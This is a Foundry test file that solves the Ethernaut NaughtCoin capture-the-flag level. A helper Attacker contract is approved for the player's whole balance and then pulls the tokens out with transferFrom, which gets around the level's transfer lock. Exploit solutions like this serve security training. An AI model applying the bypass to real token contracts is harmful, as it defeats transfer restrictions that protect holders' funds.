// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "ethernaut/levels/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new NaughtCoin(player);
    }

    function attack() private {
        // create a new middle-man contract, approve everything to them
        Attacker attacker = new Attacker(address(target));
        target.approve(address(attacker), target.balanceOf(player));

        // then let the attacker get the approved tokens
        attacker.transfer();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(target.balanceOf(player), 0, "player must have no tokens");
    }
}

contract Attacker {
    NaughtCoin target;
    address owner;

    constructor(address _target) {
        owner = msg.sender;
        target = NaughtCoin(_target);
    }

    function transfer() external {
        target.transferFrom(owner, address(this), target.balanceOf(owner));
    }
}
